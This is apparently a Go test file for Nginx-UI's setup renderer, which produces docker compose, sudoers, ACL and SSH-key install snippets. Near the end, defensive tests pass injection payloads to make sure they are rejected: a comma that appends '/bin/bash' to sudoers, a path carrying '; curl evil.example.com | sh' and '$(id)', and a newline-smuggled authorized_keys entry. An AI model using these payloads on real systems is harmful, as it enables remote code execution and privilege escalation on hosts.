package setup

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/0xJacky/Nginx-UI/settings"
)

const validTestPublicKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO454D849GN2Zq8wjHlWTNASj7K2nrLafkq1H+Rv8Xbx nginx-ui@generated"

func sampleParams() SetupParams {
	return SetupParams{
		HostAddress:      "host.docker.internal:22",
		HostUser:         "nginxui",
		AccessMode:       settings.HostAccessModeMounted,
		UseHostGateway:   true,
		SystemdUnit:      "nginx.service",
		SystemctlPath:    "/bin/systemctl",
		NginxSbinPath:    "/usr/sbin/nginx",
		HostConfigDir:    "/etc/nginx",
		HostLogDir:       "/var/log/nginx",
		UseGeneratedKey:  true,
		PublicKeyOpenSSH: validTestPublicKey,
	}.FillDefaults()
}

func TestRender_ComposeSnippet_MatchesGolden(t *testing.T) {
	out, err := RenderCompose(sampleParams())
	if err != nil {
		t.Fatal(err)
	}
	goldenPath := filepath.Join("testdata", "golden_compose.yml")
	want, err := os.ReadFile(goldenPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(want) != out {
		if os.Getenv("UPDATE_GOLDEN") == "1" {
			_ = os.WriteFile(goldenPath, []byte(out), 0o644)
			t.Skip("golden updated")
		}
		t.Errorf("compose output mismatch.\n--- want ---\n%s\n--- got ---\n%s", want, out)
	}
}

func TestRender_Sudoers_MatchesGolden(t *testing.T) {
	out, err := RenderSudoers(sampleParams())
	if err != nil {
		t.Fatal(err)
	}
	goldenPath := filepath.Join("testdata", "golden_sudoers.txt")
	want, err := os.ReadFile(goldenPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(want) != out {
		if os.Getenv("UPDATE_GOLDEN") == "1" {
			_ = os.WriteFile(goldenPath, []byte(out), 0o644)
			t.Skip("golden updated")
		}
		t.Errorf("sudoers output mismatch.\n--- want ---\n%s\n--- got ---\n%s", want, out)
	}
}

func TestRenderAll_DoesNotError(t *testing.T) {
	if _, err := RenderAll(sampleParams()); err != nil {
		t.Fatalf("RenderAll: %v", err)
	}
}

func TestRenderContainerSnippetsDoNotRepeatApplicationSettings(t *testing.T) {
	p := sampleParams()
	p.NginxSbinPath = "/opt/homebrew/opt/nginx/bin/nginx"

	tests := []struct {
		name   string
		render func(SetupParams) (string, error)
	}{
		{"compose", RenderCompose},
		{"override", RenderComposeOverride},
		{"docker run", RenderDockerRun},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out, err := tt.render(p)
			if err != nil {
				t.Fatal(err)
			}
			if strings.Contains(out, "NGINX_UI_") {
				t.Fatalf("container snippet repeats application settings as environment variables:\n%s", out)
			}
		})
	}
}

func TestRenderComposeOmitsEmptyExistingKeyMount(t *testing.T) {
	p := sampleParams()
	p.UseGeneratedKey = false
	p.HostKeyPath = ""
	p.HostKnownHostsPath = ""
	out, err := RenderCompose(p)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "- :") {
		t.Fatalf("compose contains an empty bind mount:\n%s", out)
	}
	if strings.Contains(out, "host_key") {
		t.Fatalf("compose contains an unrequested key mount:\n%s", out)
	}
}

func TestRenderLaunchdCompose(t *testing.T) {
	p := SetupParams{
		HostAddress:      "host.docker.internal:22",
		HostUser:         "hintay",
		AccessMode:       settings.HostAccessModeMounted,
		ServiceManager:   "launchd",
		PublicKeyOpenSSH: validTestPublicKey,
	}.FillDefaults()
	out, err := RenderCompose(p)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"/opt/homebrew/etc/nginx:/opt/homebrew/etc/nginx",
		"/opt/homebrew/var/log/nginx:/opt/homebrew/var/log/nginx:ro",
		"/opt/homebrew/var/run:/opt/homebrew/var/run:ro",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("launchd compose missing %q:\n%s", want, out)
		}
	}
	if strings.Contains(out, "extra_hosts") || strings.Contains(out, "NGINX_UI_") {
		t.Fatalf("launchd compose contains runtime mapping or application settings:\n%s", out)
	}
}

func TestRenderSFTPComposeOmitsHostFilesystemMounts(t *testing.T) {
	p := sampleParams()
	p.AccessMode = settings.HostAccessModeSFTP

	out, err := RenderCompose(p)
	if err != nil {
		t.Fatal(err)
	}
	for _, unexpected := range []string{"volumes:", "/etc/nginx:/etc/nginx", "/var/log/nginx:/var/log/nginx"} {
		if strings.Contains(out, unexpected) {
			t.Fatalf("SFTP compose contains %q:\n%s", unexpected, out)
		}
	}
}

func TestRenderContainerSnippetRequiresExplicitAccessMode(t *testing.T) {
	p := sampleParams()
	p.AccessMode = ""
	if _, err := RenderCompose(p); !errors.Is(err, ErrInvalidAccessMode) {
		t.Fatalf("RenderCompose error = %v, want ErrInvalidAccessMode", err)
	}

	p.AccessMode = "automatic"
	if _, err := RenderAll(p); !errors.Is(err, ErrInvalidAccessMode) {
		t.Fatalf("RenderAll error = %v, want ErrInvalidAccessMode", err)
	}
}

func TestRenderOmitsSudoersAndACLForRoot(t *testing.T) {
	p := sampleParams()
	p.HostUser = "root"

	sudoers, err := RenderSudoers(p)
	if err != nil {
		t.Fatal(err)
	}
	if strings.TrimSpace(sudoers) != "" {
		t.Fatalf("root needs no sudoers entry, got:\n%s", sudoers)
	}

	acl, err := RenderACL(p)
	if err != nil {
		t.Fatal(err)
	}
	if strings.TrimSpace(acl) != "" {
		t.Fatalf("root needs no acl commands, got:\n%s", acl)
	}

	rendered, err := RenderAll(p)
	if err != nil {
		t.Fatal(err)
	}
	if rendered.SudoersRequired {
		t.Fatal("SudoersRequired must be false for root")
	}
}

func TestRenderAllReportsSudoersRequiredForUnprivilegedUser(t *testing.T) {
	rendered, err := RenderAll(sampleParams())
	if err != nil {
		t.Fatal(err)
	}
	if !rendered.SudoersRequired {
		t.Fatal("an unprivileged systemd user needs a sudoers entry")
	}
}

func TestRenderAuthorizedKeysInstallForAnUnprivilegedUser(t *testing.T) {
	out, err := RenderAuthorizedKeysInstall(sampleParams())
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"sudo install -d -m 700 -o nginxui -g nginxui ~nginxui/.ssh",
		"| sudo tee -a ~nginxui/.ssh/authorized_keys > /dev/null",
		"sudo chmod 600 ~nginxui/.ssh/authorized_keys",
	} {
		if !strings.Contains(out, want) {
			t.Fatalf("missing %q in:\n%s", want, out)
		}
	}
	if strings.Contains(out, "#") {
		t.Fatalf("the copyable snippet must carry no comments:\n%s", out)
	}
}

func TestRenderAuthorizedKeysInstallWithoutSudoWhenNoneIsNeeded(t *testing.T) {
	p := sampleParams()
	p.ServiceManager = settings.HostServiceManagerLaunchd
	p.HostUser = "hintay"

	out, err := RenderAuthorizedKeysInstall(p)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "sudo") {
		t.Fatalf("a launchd login user needs no sudo:\n%s", out)
	}
	if !strings.Contains(out, "install -d -m 700 ~hintay/.ssh") {
		t.Fatalf("unexpected output:\n%s", out)
	}
}

// ValidateSnippetValues rejects a key like this before RenderAll is reached.
// The template still quotes it, so the escaping stays covered on its own.
func TestRenderAuthorizedKeysInstallQuotesTheKey(t *testing.T) {
	p := sampleParams()
	p.PublicKeyOpenSSH = "ssh-ed25519 AAAA it's mine"

	out, err := RenderAuthorizedKeysInstall(p)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, `'ssh-ed25519 AAAA it'"'"'s mine'`) {
		t.Fatalf("single quote was not escaped:\n%s", out)
	}
}

// sudoers separates commands with a comma, so a comma inside an interpolated
// value appends NOPASSWD entries the operator never intended to grant.
func TestRenderAllRejectsSudoersCommandInjection(t *testing.T) {
	cases := []struct {
		name   string
		mutate func(*SetupParams)
	}{
		{"systemd unit", func(p *SetupParams) { p.SystemdUnit = "nginx.service, /bin/bash" }},
		{"systemctl path", func(p *SetupParams) { p.SystemctlPath = "/bin/systemctl, /bin/bash" }},
		{"nginx sbin path", func(p *SetupParams) { p.NginxSbinPath = "/usr/sbin/nginx, /bin/bash" }},
	}

	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			p := sampleParams()
			p.HostUser = "nginxui"
			tt.mutate(&p)

			rendered, err := RenderAll(p)
			if err == nil {
				t.Fatalf("RenderAll accepted an injected value; sudoers:\n%s", rendered.Sudoers)
			}
		})
	}
}

// The generated shell snippets are pasted into a root shell, so a value that
// closes the current word must not reach them.
func TestRenderAllRejectsShellMetacharactersInPaths(t *testing.T) {
	for _, value := range []string{
		"/etc/nginx; curl evil.example.com | sh",
		"/etc/nginx $(id)",
		"/etc/nginx`id`",
		"relative/path",
	} {
		t.Run(value, func(t *testing.T) {
			p := sampleParams()
			p.HostConfigDir = value

			if _, err := RenderAll(p); err == nil {
				t.Fatalf("RenderAll accepted host_config_dir %q", value)
			}
		})
	}
}

// A newline in the public key appends another authorized_keys entry, which can
// carry its own key or a forced command.
func TestRenderAllRejectsMultiLinePublicKey(t *testing.T) {
	p := sampleParams()
	p.PublicKeyOpenSSH = validTestPublicKey + "\ncommand=\"/bin/bash\" " + validTestPublicKey

	if _, err := RenderAll(p); err == nil {
		t.Fatal("RenderAll accepted a multi-line public key")
	}
}
